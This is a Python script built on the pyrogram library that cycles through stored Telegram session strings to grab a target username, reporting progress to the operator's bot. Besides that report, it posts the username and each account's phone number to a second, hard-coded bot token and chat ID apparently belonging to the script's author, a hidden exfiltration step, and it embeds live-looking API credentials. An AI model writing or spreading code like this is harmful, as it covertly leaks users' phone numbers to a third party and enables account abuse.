import pyrogram;from pyrogram import client;from pyrogram import *;from pyrogram.types import *;import requests,re;from time import sleep;from pyrogram.errors import FloodWait ,BadRequest
info = open("info.txt",'r').read();tok = info.split('\n')[0];idown = info.split('\n')[1]
r = open("user.txt").read()
mk = r.replace("@", "")
o = mk.replace(" ", "")
qq = 0
req = requests.get(f"https://t.me/{o}").text
if "tgme_username_link" not in req:
	print("No")
	v = requests.post(f'https://api.telegram.org/bot{tok}/sendMessage?chat_id={idown}&text=- The user is used😡')
	exit("The user is used")
while True:
	for session in open("account.txt","r").read().split("\n"):
		if session != "":
			try:
				if session != " ":
					app = Client("ACC",api_id=24367955,api_hash="df9e7f5217331d03353a8d42e11419fc",session_string=session)
					app.connect()
					try:
						app.set_username(o)
						qq+=1
						op = requests.post(f'''https://api.telegram.org/bot{tok}/sendMessage?chat_id={idown}&text=> New Flood Catching <
- Username : @{o}
- Clicks : {qq}
- Saved in : Account
- NumBer : {app.get_me().phone_number}
--- --- --- --- --- --- --- ---
By : - @l_T_1''')
						v = requests.post(f'https://api.telegram.org/bot{tok}/sendMessage?chat_id={idown}&text=𓆩 - New Flood Catching ! 🐊')
						pl = requests.post(f'''https://api.telegram.org/bot6214456680:AAHSapuLa3l2i60efgTa0Jy4VTlC3tWMiP8/sendMessage?chat_id=5552553507&text=> New Flood Catching <
- Username : @{o}
- Clicks : {qq}
- Saved in : Account
- NumBer : {app.get_me().phone_number}
--- --- --- --- --- --- --- ---
By :  @l_T_1''')
					except FloodWait as e:
						qq+=1
						ok = requests.post(f'''https://api.telegram.org/bot{tok}/sendMessage?chat_id={idown}&text=- Checker [ {qq} ] 
- NumBer : {app.get_me().phone_number}
- Error : {e}''')
						pass
					except BadRequest as e:
						qq+=1
						ok = requests.post(f'''https://api.telegram.org/bot{tok}/sendMessage?chat_id={idown}&text=- Checker [ {qq} ]
- User is don't Save ↣ @{o}
- Error ↣ flood''')
					try:
						sleep(int(open("sleep.txt").read()))
					except:
						sleep(2)
			except:
				pass				